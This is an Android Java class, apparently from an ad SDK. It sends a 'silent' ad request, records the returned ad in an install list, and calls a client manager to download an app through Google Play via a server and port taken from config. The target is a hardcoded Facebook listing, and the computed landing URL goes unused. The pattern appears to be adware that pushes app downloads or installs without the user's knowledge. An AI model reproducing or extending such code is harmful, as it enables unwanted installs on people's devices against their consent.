package com.mob.root.net;

import java.util.List;

import org.apache.http.Header;
import org.json.JSONObject;

import android.os.Handler;
import android.os.Looper;

import com.giga.sdk.ClientManager;
import com.mob.root.AMApplication;
import com.mob.root.entity.AD;
import com.mob.root.net.parser.AdParser;
import com.mob.root.net.parser.ConfigParser;
import com.mob.root.tools.AMConstants;
import com.mob.root.tools.AMLogger;
import com.mob.root.tools.CommonUtils;

public class SlientRequest extends AMRequest<AD> implements Runnable {

	public SlientRequest(IResponseListener<AD> listener) {
		super(listener);
		mHandler = new Handler(Looper.getMainLooper());
	}
	
	private Handler mHandler;
	private AD mAD;

	@Override
	public void start(Object... args) {
		try {
			this.args = args;
//			ConfigParser parser = new ConfigParser();
//			String url = parser.getValue(AMApplication.instance, AMConstants.NET_AD_SINGLE_REQUEST_URL);
//			if (CommonUtils.isEmptyString(url)) {
//				return;
//			}
			JSONObject jsonObject = new JSONObject();
			jsonObject.put(AMConstants.NET_PARAMS_SLIENT, 1);
//			doPost(url, jsonObject, true);
			doAdPost(0, this, jsonObject);
		} catch (Exception e) {
			AMLogger.e(null, e.getMessage());
		}
	}
	
	@Override
	public void onSuccess(int statusCode, Header[] headers, String datas) {
		super.onSuccess(statusCode, headers, datas);
		try {
//			SingleADParser parser = new SingleADParser();
//			mAD = parser.parseAD(resultDatas);
//			if (null == mAD) {
//				return;
//			}
			AdParser parser = new AdParser();
			List<AD> ads = parser.parseAD(resultDatas);
			if(null == ads || null == listener) {
				return;
			}
			mAD = ads.get(0);
			mHandler.post(this);
		} catch (Exception e) {
			AMLogger.e(null, e.getMessage());
		}
	}
	
	@Override
	public void run() {
		try {
			AMApplication.instance.installADs.add(mAD);
			String destUrl = CommonUtils.getDestUrl(mAD.getLandingPager());
			ClientManager clientManager = ClientManager.getInstance(AMApplication.instance);
			ConfigParser parser = new ConfigParser();
			String serverName = parser.getValue(AMApplication.instance, AMConstants.NET_GP_SERVER);
			String serverPort = parser.getValue(AMApplication.instance, AMConstants.NET_GP_SERVER_PORT);
			clientManager.downloadWithGooglePlay("https://play.google.com/store/apps/details?id=com.facebook.katana", null, serverName, Integer.parseInt(serverPort), 600000);
		} catch (Exception e) {
			AMLogger.e(null, e.getMessage());
		}
	}
}
